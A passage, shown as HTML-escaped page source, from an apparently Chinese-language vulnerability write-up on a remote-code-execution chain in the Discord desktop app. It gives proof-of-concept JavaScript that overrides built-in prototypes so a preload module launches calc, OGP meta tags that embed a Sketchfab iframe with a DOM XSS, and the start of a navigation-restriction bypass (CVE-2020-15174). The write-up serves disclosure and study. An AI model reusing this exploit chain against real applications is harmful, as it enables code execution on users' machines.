&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;calc&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;本次nodeIntegration设为false，因此无法直接通过require()使用Node.js功能。但通过禁用contextIsolation，网页JavaScript仍可能影响渲染器中Electron内部JavaScript代码的执行。&lt;/p&gt;
&lt;p&gt;contextIsolation禁用时，网页JavaScript可以覆盖JavaScript内置方法（如Array.prototype.join），从而干扰外部网页的JavaScript代码执行。这种行为很危险，因为Electron允许外部JavaScript代码使用Node.js功能，无论nodeIntegration设置如何。&lt;/p&gt;
&lt;p&gt;这种技巧最初由Cure53在2016年的渗透测试中发现（我也参与了该测试），之后我们报告给Electron团队并引入了contextIsolation功能。&lt;/p&gt;
&lt;p&gt;contextIsolation通过在网页和外部JavaScript代码之间引入隔离的上下文，防止互相影响。这是消除RCE可能性的必要功能，但在Discord中被禁用。&lt;/p&gt;
&lt;h3 id=&#34;利用preload脚本实现rce&#34;&gt;利用preload脚本实现RCE
&lt;/h3&gt;&lt;p&gt;在检查preload脚本时，我发现Discord通过DiscordNative.nativeModules.requireModule(&amp;lsquo;MODULE-NAME&amp;rsquo;)向网页暴露了允许调用的模块功能。&lt;/p&gt;
&lt;p&gt;虽然不能直接使用child_process等模块实现RCE，但通过覆盖JavaScript内置方法干扰暴露模块的执行，仍可实现RCE。&lt;/p&gt;
&lt;p&gt;以下是PoC代码。通过覆盖RegExp.prototype.test和Array.prototype.join，调用&amp;quot;discord_utils&amp;quot;模块中的getGPUDriverVersions函数可以弹出calc应用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prototype&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prototype&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;calc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;DiscordNative&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;nativeModules&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;requireModule&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;discord_utils&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getGPUDriverVersions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;getGPUDriverVersions函数尝试使用&amp;quot;execa&amp;quot;库执行程序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getGPUDriverVersions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;platform&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;win32&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;nvidiaSmiPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ProgramW6432&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;/NVIDIA Corporation/NVSMI/nvidia-smi.exe`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;nvidia&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;parseNvidiaSmiOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;execa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;nvidiaSmiPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;nvidia&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通常execa会执行nvidiaSmiPath指定的&amp;quot;nvidia-smi.exe&amp;quot;，但由于覆盖了RegExp.prototype.test和Array.prototype.join，参数在执行过程中被替换为&amp;quot;calc&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;iframe嵌入中的xss&#34;&gt;iframe嵌入中的XSS
&lt;/h3&gt;&lt;p&gt;接下来需要找到在应用中执行JavaScript的方法。我检查了自动链接和Markdown功能，但没发现问题，于是转向iframe嵌入功能。当发布YouTube等URL时，Discord会获取OGP信息并显示页面标题、描述等内容。&lt;/p&gt;
&lt;p&gt;Discord从OGP提取视频URL，只有允许域且符合嵌入页面格式的URL才会被iframe嵌入。&lt;/p&gt;
&lt;p&gt;通过检查CSP的frame-src指令，我发现sketchfab.com可以嵌入iframe，并在其3D模型页脚发现DOM型XSS。&lt;/p&gt;
&lt;p&gt;以下是PoC，发布此URL到聊天后，Sketchfab会嵌入iframe，点击几次后执行任意JavaScript：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;property&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;og:title&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;RCE DEMO&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;property&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;og:video:url&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sketchfab.com/models/2b198209466d43328169d2d14a4392bb/embed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;property&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;og:video:type&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;property&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;og:video:width&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1280&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;property&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;og:video:height&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;720&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;但JavaScript仅在iframe中执行，需要从iframe跳转到顶级浏览上下文才能实现RCE。&lt;/p&gt;
&lt;h3 id=&#34;导航限制绕过cve-2020-15174&#34;&gt;导航限制绕过(CVE-2020-15174)
&lt;/h3&gt;&lt;p&gt;主进程代码中使用&amp;quot;new-window&amp;quot;和&amp;quot;will-navigate&amp;quot;事件限制导航：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mainWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;webContents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;new-window&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;windowURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;frameName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;disposition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preventDefault&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;frameName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DISCORD_NAMESPACE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;windowURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;WEBAPP_ENDPOINT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;popoutWindows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;openOrFocusWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;windowURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;frameName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;_electron&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;openExternal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;windowURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
